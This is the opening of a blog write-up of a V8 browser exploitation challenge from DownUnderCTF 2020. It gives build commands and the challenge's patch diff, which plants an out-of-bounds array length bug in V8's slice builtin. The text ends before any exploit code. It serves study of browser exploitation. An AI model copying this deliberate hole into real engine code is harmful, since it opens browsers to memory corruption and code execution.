






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="light"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>DownunderCTF: V8 Pwn &middot; Congo</title>
    <meta name="title" content="DownunderCTF: V8 Pwn &middot; Congo" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.8d03f49bff76158e114fdf6d18be3ad4d3b70309a01aebb97468ef8fd8d3b50a.css"
    integrity="sha256-jQP0m/92FY4RT99tGL461NO3AwmgGuu5dGjvj9jTtQo="
  />
  
  
  
  
  
  
  
  <meta
    name="description"
    content="
      
        {% img /img/banner/downunder.
      
    "
  />
  
  
  
  <link rel="canonical" href="//localhost:1313/blog/v8-pwn-downunderctf/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/blog/v8-pwn-downunderctf/">
  <meta property="og:site_name" content="Congo">
  <meta property="og:title" content="DownunderCTF: V8 Pwn">
  <meta property="og:description" content="{% img /img/banner/downunder.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="DownunderCTF: V8 Pwn">
<meta name="twitter:description" content="{% img /img/banner/downunder.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blogs",
    "name": "DownunderCTF: V8 Pwn",
    "headline": "DownunderCTF: V8 Pwn",
    
    "abstract": "{% img \/img\/banner\/downunder.",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/blog\/v8-pwn-downunderctf\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    
    
    
    
    
    
    
    
    "mainEntityOfPage": "true",
    "wordCount": "5525"
  }
  </script>


  
  
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >Congo</a
  >

    </div>
    
    
      <ul class="flex list-none flex-col text-end sm:flex-row">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href=""
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
              
                
                
              
            </li>
          
            
              
          
        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article>
    <header class="max-w-prose">
      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        DownunderCTF: V8 Pwn
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">1 January 0001</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">26 mins</span>
    

    
    
  </div>

  
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
      <div class="min-h-0 min-w-0 max-w-prose grow">
        <p>{% img /img/banner/downunder.png %}
In-depth write-up of the V8 challenge from DownUnderCTF 2020.</p>
<!-- more -->
<h1 id="foreword" class="relative group">Foreword <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foreword" aria-label="Anchor">#</a></span></h1><p>Unfortunately I couldn&rsquo;t solve the challenge, as it was supposed to be easy one still I couldn&rsquo;t but I thought I should do a post with the writeups/exploits from other people and make it very explainative such that I can use for reference later so when I&rsquo;ll get stucked I can take a look and move on with research and who knows maybe it&rsquo;ll be helpful for others too. This write-up mostly revolve around the references listed at the bottom.</p>
<h3 id="setup" class="relative group">Setup <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#setup" aria-label="Anchor">#</a></span></h3><p>Although, there&rsquo;s not much to setup as the author was kind enough to give us the <code>d8</code> binary which is the build version of the debug version and patch file. Although, having a release version is best, let&rsquo;s build it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~</span><span class="nf">$</span> <span class="no">fetch</span> <span class="no">v8</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~</span><span class="nf">$</span> <span class="no">cd</span> <span class="no">v8</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">build</span><span class="err">/</span><span class="no">install-build-deps.sh</span>    
</span></span><span class="line"><span class="cl"><span class="no">d4mian@pwnbox</span><span class="p">:</span><span class="err">~/</span><span class="no">v8$</span> <span class="no">git</span> <span class="no">checkout</span> <span class="mi">47054</span><span class="no">c840e26394dea0e36df47884202a15dd16d</span> <span class="c1"># Commit was mentioned in the challenge 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">gclient</span> <span class="no">sync</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">git</span> <span class="no">apply</span> <span class="no">..</span><span class="err">/</span><span class="no">patch.diff</span> <span class="c1"># Path to the patch file provided
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">v8gen.py</span> <span class="no">x64.release</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">ninja</span> <span class="p">-</span><span class="no">C</span> <span class="p">.</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.release</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">v8gen.py</span> <span class="no">x64.debug</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">ninja</span> <span class="p">-</span><span class="no">C</span> <span class="p">.</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span>
</span></span></code></pre></div><blockquote>
<p>Credit: <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noreferrer">Faith</a></p>
</blockquote>
<h1 id="patch" class="relative group">Patch <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#patch" aria-label="Anchor">#</a></span></h1><p>As we used to reverse engineer the binary in a typical pwn challenge but in case browser pwn, we get a patch file with the commit hash so that we can apply the patch and build the d8, let&rsquo;s analyse the challenges made by the author:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">diff</span> <span class="o">--</span><span class="nx">git</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span> <span class="mi">7</span><span class="nx">b82f2bda3</span><span class="p">..</span><span class="mi">4</span><span class="nx">b9478f84e</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">101</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">101</span><span class="p">,</span><span class="mi">14</span> <span class="err">@@</span> <span class="nx">macro</span> <span class="nx">HandleFastSlice</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">         <span class="c1">// to be copied out. Therefore, re-check the length before calling
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="c1">// the appropriate fast path. See regress-785804.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="k">if</span> <span class="p">(</span><span class="nx">SmiAbove</span><span class="p">(</span><span class="nx">start</span> <span class="o">+</span> <span class="nx">count</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">))</span> <span class="kr">goto</span> <span class="nx">Bailout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>        <span class="k">return</span> <span class="nx">ExtractFastJSArray</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">start</span><span class="p">,</span> <span class="nx">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="c1">// return ExtractFastJSArray(context, a, start, count);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="c1">// Instead of doing it the usual way, I&#39;ve found out that returning it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="c1">// the following way gives us a 10x speedup!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="kr">const</span> <span class="nx">array</span><span class="o">:</span> <span class="nx">JSArray</span> <span class="o">=</span> <span class="nx">ExtractFastJSArray</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">start</span><span class="p">,</span> <span class="nx">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="kr">const</span> <span class="nx">newLength</span><span class="o">:</span> <span class="nx">Smi</span> <span class="o">=</span> <span class="nx">Cast</span><span class="o">&lt;</span><span class="nx">Smi</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">count</span> <span class="o">-</span> <span class="nx">start</span> <span class="o">+</span> <span class="nx">SmiConstant</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>            <span class="nx">otherwise</span> <span class="nx">Bailout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nx">array</span><span class="p">.</span><span class="nx">ChangeLength</span><span class="p">(</span><span class="nx">newLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="nx">array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="cl">       <span class="k">case</span> <span class="p">(</span><span class="nx">a</span><span class="o">:</span> <span class="nx">JSStrictArgumentsObject</span><span class="p">)</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="kr">goto</span> <span class="nx">HandleSimpleArgumentsSlice</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">diff</span> <span class="o">--</span><span class="nx">git</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">d8</span><span class="o">/</span><span class="nx">d8</span><span class="p">.</span><span class="nx">cc</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">d8</span><span class="o">/</span><span class="nx">d8</span><span class="p">.</span><span class="nx">cc</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span> <span class="mi">26</span><span class="nx">ccb62c68</span><span class="p">..</span><span class="mi">8114</span><span class="nx">a861cc</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">d8</span><span class="o">/</span><span class="nx">d8</span><span class="p">.</span><span class="nx">cc</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">d8</span><span class="o">/</span><span class="nx">d8</span><span class="p">.</span><span class="nx">cc</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">1342</span><span class="p">,</span><span class="mi">9</span> <span class="o">+</span><span class="mi">1342</span><span class="p">,</span><span class="mi">12</span> <span class="err">@@</span> <span class="nx">MaybeLocal</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span> <span class="nx">Shell</span><span class="o">::</span><span class="nx">CreateRealm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">     <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="k">delete</span><span class="p">[]</span> <span class="nx">old_realms</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>  <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">ObjectTemplate</span><span class="o">&gt;</span> <span class="nx">global_template</span> <span class="o">=</span> <span class="nx">CreateGlobalTemplate</span><span class="p">(</span><span class="nx">isolate</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="c1">// Remove globals
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>  <span class="c1">//Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span> <span class="nx">context</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>      <span class="nx">Context</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">nullptr</span><span class="p">,</span> <span class="nx">global_template</span><span class="p">,</span> <span class="nx">global_object</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>      <span class="c1">//Context::New(isolate, nullptr, global_template, global_object);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>      <span class="nx">Context</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">nullptr</span><span class="p">,</span> <span class="nx">ObjectTemplate</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                   <span class="nx">v8</span><span class="o">::</span><span class="nx">MaybeLocal</span><span class="o">&lt;</span><span class="nx">Value</span><span class="o">&gt;</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">   <span class="nx">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="nx">try_catch</span><span class="p">.</span><span class="nx">HasCaught</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">IsEmpty</span><span class="p">())</span> <span class="k">return</span> <span class="nx">MaybeLocal</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">   <span class="nx">InitializeModuleEmbedderData</span><span class="p">(</span><span class="nx">context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">2285</span><span class="p">,</span><span class="mi">10</span> <span class="o">+</span><span class="mi">2288</span><span class="p">,</span><span class="mi">13</span> <span class="err">@@</span> <span class="k">void</span> <span class="nx">Shell</span><span class="o">::</span><span class="nx">Initialize</span><span class="p">(</span><span class="nx">Isolate</span><span class="o">*</span> <span class="nx">isolate</span><span class="p">,</span> <span class="nx">D8Console</span><span class="o">*</span> <span class="nx">console</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">             <span class="nx">v8</span><span class="o">::</span><span class="nx">Isolate</span><span class="o">::</span><span class="nx">kMessageLog</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="c1">// Prevent `import(&#34;stuff&#34;)`
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>  <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">   isolate-&gt;SetHostImportModuleDynamicallyCallback(
</span></span></span><span class="line"><span class="cl"><span class="cm">       Shell::HostImportModuleDynamically);
</span></span></span><span class="line"><span class="cl"><span class="cm">   isolate-&gt;SetHostInitializeImportMetaObjectCallback(
</span></span></span><span class="line"><span class="cl"><span class="cm">       Shell::HostInitializeImportMetaObject);
</span></span></span><span class="line"><span class="cl"><span class="cm">+  */</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="err">#</span><span class="nx">ifdef</span> <span class="nx">V8_FUZZILLI</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Let the parent process (Fuzzilli) know we are ready.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">@@</span> <span class="o">-</span><span class="mi">2316</span><span class="p">,</span><span class="mi">9</span> <span class="o">+</span><span class="mi">2322</span><span class="p">,</span><span class="mi">11</span> <span class="err">@@</span> <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span> <span class="nx">Shell</span><span class="o">::</span><span class="nx">CreateEvaluationContext</span><span class="p">(</span><span class="nx">Isolate</span><span class="o">*</span> <span class="nx">isolate</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// This needs to be a critical section since this is not thread-safe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nx">base</span><span class="o">::</span><span class="nx">MutexGuard</span> <span class="nx">lock_guard</span><span class="p">(</span><span class="nx">context_mutex_</span><span class="p">.</span><span class="nx">Pointer</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Initialize the global objects
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">-</span>  <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">ObjectTemplate</span><span class="o">&gt;</span> <span class="nx">global_template</span> <span class="o">=</span> <span class="nx">CreateGlobalTemplate</span><span class="p">(</span><span class="nx">isolate</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="c1">//Local&lt;ObjectTemplate&gt; global_template = CreateGlobalTemplate(isolate);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nx">EscapableHandleScope</span> <span class="nx">handle_scope</span><span class="p">(</span><span class="nx">isolate</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>  <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">Context</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">nullptr</span><span class="p">,</span> <span class="nx">global_template</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="c1">//Local&lt;Context&gt; context = Context::New(isolate, nullptr, global_template);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>  <span class="nx">Local</span><span class="o">&lt;</span><span class="nx">Context</span><span class="o">&gt;</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">Context</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">,</span> <span class="nx">nullptr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>                                        <span class="nx">ObjectTemplate</span><span class="o">::</span><span class="nx">New</span><span class="p">(</span><span class="nx">isolate</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">   <span class="nx">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="nx">context</span><span class="p">.</span><span class="nx">IsEmpty</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nx">i</span><span class="o">::</span><span class="nx">FLAG_perf_prof_annotate_wasm</span> <span class="o">||</span> <span class="nx">i</span><span class="o">::</span><span class="nx">FLAG_vtune_prof_annotate_wasm</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nx">isolate</span><span class="o">-&gt;</span><span class="nx">SetWasmLoadSourceMapCallback</span><span class="p">(</span><span class="nx">ReadFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">diff</span> <span class="o">--</span><span class="nx">git</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">objects</span><span class="o">/</span><span class="nx">js</span><span class="o">-</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">objects</span><span class="o">/</span><span class="nx">js</span><span class="o">-</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span> <span class="nx">a4d4b9d356</span><span class="p">..</span><span class="mf">7e2738</span><span class="nx">b96e</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">objects</span><span class="o">/</span><span class="nx">js</span><span class="o">-</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">objects</span><span class="o">/</span><span class="nx">js</span><span class="o">-</span><span class="nx">array</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">26</span><span class="p">,</span><span class="mi">6</span> <span class="o">+</span><span class="mi">26</span><span class="p">,</span><span class="mi">10</span> <span class="err">@@</span> <span class="nx">macro</span> <span class="nx">CreateArrayIterator</span><span class="p">(</span><span class="nx">implicit</span> <span class="nx">context</span><span class="o">:</span> <span class="nx">NativeContext</span><span class="p">)(</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="nx">extern</span> <span class="kr">class</span> <span class="nx">JSArray</span> <span class="kr">extends</span> <span class="nx">JSObject</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="nx">macro</span> <span class="nx">ChangeLength</span><span class="p">(</span><span class="nx">newLength</span><span class="o">:</span> <span class="nx">Smi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>    <span class="k">this</span><span class="p">.</span><span class="nx">length</span> <span class="o">=</span> <span class="nx">newLength</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>  
</span></span><span class="line"><span class="cl">   <span class="nx">macro</span> <span class="nx">IsEmpty</span><span class="p">()</span><span class="o">:</span> <span class="nx">bool</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s break it down, the first changes made in <code>array-slice.tq</code> is our cue here, we need to focus on that:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">diff</span> <span class="o">--</span><span class="nx">git</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span> <span class="mi">7</span><span class="nx">b82f2bda3</span><span class="p">..</span><span class="mi">4</span><span class="nx">b9478f84e</span> <span class="mi">100644</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="nx">a</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="o">+++</span> <span class="nx">b</span><span class="o">/</span><span class="nx">src</span><span class="o">/</span><span class="nx">builtins</span><span class="o">/</span><span class="nx">array</span><span class="o">-</span><span class="nx">slice</span><span class="p">.</span><span class="nx">tq</span>
</span></span><span class="line"><span class="cl"><span class="err">@@</span> <span class="o">-</span><span class="mi">101</span><span class="p">,</span><span class="mi">7</span> <span class="o">+</span><span class="mi">101</span><span class="p">,</span><span class="mi">14</span> <span class="err">@@</span> <span class="nx">macro</span> <span class="nx">HandleFastSlice</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">         <span class="c1">// to be copied out. Therefore, re-check the length before calling
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="c1">// the appropriate fast path. See regress-785804.js
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>         <span class="k">if</span> <span class="p">(</span><span class="nx">SmiAbove</span><span class="p">(</span><span class="nx">start</span> <span class="o">+</span> <span class="nx">count</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">))</span> <span class="kr">goto</span> <span class="nx">Bailout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span>        <span class="k">return</span> <span class="nx">ExtractFastJSArray</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">start</span><span class="p">,</span> <span class="nx">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="c1">// return ExtractFastJSArray(context, a, start, count);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="c1">// Instead of doing it the usual way, I&#39;ve found out that returning it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="c1">// the following way gives us a 10x speedup!
